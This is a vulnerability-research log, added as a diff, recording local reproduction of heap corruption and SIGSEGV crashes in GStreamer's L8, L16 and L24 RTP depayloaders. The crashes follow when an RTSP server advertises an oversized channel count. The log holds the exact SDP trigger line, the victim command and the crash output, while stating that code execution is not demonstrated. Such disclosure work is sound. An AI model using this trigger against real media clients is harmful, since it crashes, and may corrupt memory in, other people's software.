@@ -1,0 +1,55 @@
+gst2shell — pre-auth RTSP caps reachability across the advisory-affected depay family
+2026-11-21, all on 127.0.0.1; no external probe, no credentials.
+
+HARNESSES (digests at final run)
+  rtsp_server_codec.py
+    sha256 1493f137e48baa063cdf6f06ec7483da878ca2512b56220e7ed455755a3cb45c
+  run_rtsp_family.sh
+    sha256 54e8331ef140144b57e264debf9ee4bf52f725f3144aea2e193e0f573b5d786e
+  Original pinned rtsp_server.py / run_rtsp.sh left untouched; L16 evidence
+  from the prior wake stands independently.
+
+PATH
+  python3 rtsp_server_codec.py PORT N CODEC serves one audio track with
+    a=rtpmap:96 <CODEC>/44100/N
+  Victim: stock `gst-launch-1.0 -v uridecodebin uri=rtsp://127.0.0.1:PORT/ !
+  fakesink` — no element named by the harness, no SDP structure-name
+  modelling. rtspsrc propagates the SDP encoding-params unmodified; decodebin
+  itself auto-plugs GstRtpL8Depay / GstRtpL16Depay / GstRtpL24Depay.
+
+RTP payload: 12-byte header + 96 zero bytes. 96 is a multiple of all three
+frame sizes (L8 8, L16 16, L24 24 bytes at 8 channels), so benign N=8 runs
+are valid; an earlier 16/64-byte payload made L24 N=8 fail with
+"Channel reordering failed" (a payload-length artefact, not memory corruption).
+
+RESULTS (gst-launch rc)
+  codec  N=8                   N=1000
+  L8     124 (alive)           134 (SIGABRT, heap corruption)
+  L16    0   (clean EOS)       124 (Caught SIGSEGV; segtrap spins)
+  L24    124 (alive)           134 (SIGABRT, heap corruption)
+
+EXACT QUOTED LINES (N=1000, from family_<CODEC>_1000.log)
+  L8:
+    ...GstRtpL8Depay:rtpl8depay0: extensions = <  >
+    malloc(): unaligned tcache chunk detected
+  L24:
+    ...GstRtpL24Depay:rtpl24depay0: extensions = <  >
+    malloc(): invalid size (unsorted)
+  L16:
+    ...GstRtpL16Depay:rtpl16depay0: extensions = <  >
+    Caught SIGSEGV
+    Spinning.  Please run 'gdb gst-launch-1.0 <pid>' ...
+
+On every N=1000 path rtspsrc first emits
+    caps = application/x-rtp, media=(string)audio, payload=(int)96,
+    clock-rate=(int)44100, encoding-name=(string)<CODEC>,
+    encoding-params=(string)1000, ...
+unmodified. N=8 emits encoding-params=(string)8 and faults nowhere.
+
+The L16 N=1000 manifestation is allocator/timing dependent: an earlier run
+of this same stock path (commit f1ae78d) aborted rc 134 with
+malloc(): invalid size (unsorted); this run's SIGSEGV was caught by
+GStreamer's segtrap handler, so the 12s timeout returns 124. Both are faults.
+The stable claim is "attacker-chosen count faults the victim", not a specific
+instruction or glibc message. Chosen-byte control / arbitrary pointer / RCE
+remain NOT DEMONSTRATED.
